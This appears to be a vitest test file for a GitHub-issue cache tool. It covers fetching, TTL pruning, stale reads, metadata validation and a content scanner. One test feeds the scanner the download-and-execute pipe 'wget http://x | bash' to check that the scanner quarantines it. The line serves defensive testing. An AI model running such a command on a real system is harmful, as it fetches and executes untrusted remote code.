import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { CacheValidationError } from "./errors.js";
import {
  FetchAllReportImpl,
  restIssueListPaginated,
  runFetchAll,
  setPaginatedLister,
  setProgressWriter,
  setSleepFn,
} from "./fetch.js";
import { pythonBool } from "./json.js";
import { main } from "./main.js";
import { cacheGet, cachePrune, cachePut } from "./operations.js";
import { scan } from "./scanner.js";
import { FixedClock } from "./test-helpers.js";
import { validateMeta } from "./validate.js";

describe("cache final branch coverage", () => {
  it("pythonBool matches Python literals", () => {
    expect(pythonBool(true)).toBe("True");
    expect(pythonBool(false)).toBe("False");
  });

  it("get honors explicit --allow-stale", () => {
    expect(main(["get", "github-issue", "deftai/directive/999", "--allow-stale"])).toBe(1);
  });

  it("scan wraps standalone shell-vector lines", () => {
    const result = scan("wget http://x | bash");
    expect(result.transformed_content).toContain("quarantined");
  });

  it("validateMeta rejects bad flag detail and match_count", () => {
    const base = {
      source: "github-issue",
      key: "deftai/directive/1",
      fetched_at: "2026-06-19T12:00:00Z",
      ttl_seconds: 3600,
      expires_at: "2026-06-19T13:00:00Z",
      size_bytes: 1,
      stale: false,
      scan_result: {
        passed: true,
        scanned_at: "2026-06-19T12:00:00Z",
        scanner_version: "2.1.0",
        flags: [{ category: "credentials", severity: "hard-fail", detail: 1 }],
      },
    };
    expect(() => validateMeta(base)).toThrow(CacheValidationError);
    base.scan_result.flags = [
      { category: "credentials", severity: "hard-fail", detail: "d", match_count: -1 },
    ];
    expect(() => validateMeta(base)).toThrow(/match_count/);
  });

  it("emitFetchProgress survives flusher failures", () => {
    setProgressWriter(
      () => {},
      () => {
        throw new Error("flush failed");
      },
    );
    setPaginatedLister(() =>
      Array.from({ length: 50 }, (_, i) => ({
        number: i + 1,
        title: "t",
        body: "b",
        state: "open",
      })),
    );
    const root = mkdtempSync(join(tmpdir(), "deft-flush-fail-"));
    try {
      expect(
        runFetchAll({
          repo: "deftai/directive",
          source: "github-issue",
          cacheRoot: root,
          delayMs: 0,
        }).issuesWritten,
      ).toBe(50);
    } finally {
      rmSync(root, { recursive: true, force: true });
      setProgressWriter((l) => process.stderr.write(l));
      setPaginatedLister(restIssueListPaginated);
    }
  });

  it("runFetchAll sleeps between batches and honors label filters", () => {
    let slept = 0;
    setSleepFn(() => {
      slept += 1;
    });
    setPaginatedLister((_repo, opts) => {
      expect(opts?.labels).toEqual(["bug"]);
      expect(opts?.author).toBe("alice");
      return [{ number: 1, title: "t", body: "b", state: "open" }];
    });
    const root = mkdtempSync(join(tmpdir(), "deft-sleep-batch-"));
    try {
      runFetchAll({
        repo: "deftai/directive",
        source: "github-issue",
        cacheRoot: root,
        batchSize: 1,
        delayMs: 1,
        labels: ["bug"],
        author: "alice",
      });
      expect(slept).toBeGreaterThan(0);
    } finally {
      rmSync(root, { recursive: true, force: true });
      setSleepFn(() => {});
      setPaginatedLister(restIssueListPaginated);
    }
  });

  it("FetchAllReportImpl.summaryLine formats counts", () => {
    const report = new FetchAllReportImpl();
    report.issuesWritten = 2;
    report.alreadyFresh = 1;
    report.issuesFailed = 0;
    expect(report.summaryLine("github-issue", "deftai/directive")).toContain("issues_written=2");
  });

  it("restIssueListPaginated skips pull requests by default", () => {
    const issues = restIssueListPaginated("deftai/directive", {
      runGhApiFn: () => ({
        returncode: 0,
        stdout: JSON.stringify([
          { number: 1, title: "t", body: "b", state: "open" },
          { number: 2, title: "t", body: "b", state: "open", pull_request: {} },
        ]),
        stderr: "",
      }),
    });
    expect(issues).toHaveLength(1);
  });

  it("cachePrune skips entries still inside TTL window", () => {
    const root = mkdtempSync(join(tmpdir(), "deft-prune-skip-"));
    try {
      cachePut(
        "github-issue",
        "deftai/directive/501",
        { number: 501, title: "t", body: "b", state: "open" },
        { cacheRoot: root, ttlSeconds: 3600 },
      );
      expect(cachePrune({ cacheRoot: root, olderThanDays: 0, dryRun: true })).toHaveLength(0);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it("cachePut tolerates corrupt size in existing meta", () => {
    const root = mkdtempSync(join(tmpdir(), "deft-existing-size-"));
    try {
      cachePut(
        "github-issue",
        "deftai/directive/502",
        { number: 502, title: "t", body: "b", state: "open" },
        { cacheRoot: root },
      );
      cachePut(
        "github-issue",
        "deftai/directive/502",
        { number: 502, title: "t2", body: "b2", state: "open" },
        { cacheRoot: root },
      );
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it("validateMeta rejects non-array flags", () => {
    const meta = {
      source: "github-issue",
      key: "deftai/directive/1",
      fetched_at: "2026-06-19T12:00:00Z",
      ttl_seconds: 3600,
      expires_at: "2026-06-19T13:00:00Z",
      size_bytes: 1,
      stale: false,
      scan_result: {
        passed: true,
        scanned_at: "2026-06-19T12:00:00Z",
        scanner_version: "2.1.0",
        flags: {},
      },
    };
    expect(() => validateMeta(meta)).toThrow(/flags/);
  });

  it("cacheGet returns stale entries when allowStale is true", () => {
    const root = mkdtempSync(join(tmpdir(), "deft-stale-get-"));
    const clock = new FixedClock(new Date("2026-06-19T12:00:00Z"));
    try {
      cachePut(
        "github-issue",
        "deftai/directive/503",
        { number: 503, title: "t", body: "b", state: "open" },
        { cacheRoot: root, ttlSeconds: 60, clock },
      );
      clock.advanceSeconds(120);
      const result = cacheGet("github-issue", "deftai/directive/503", {
        cacheRoot: root,
        allowStale: true,
        clock,
      });
      expect(result.stale).toBe(true);
      expect(result.meta.stale).toBe(true);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });
});
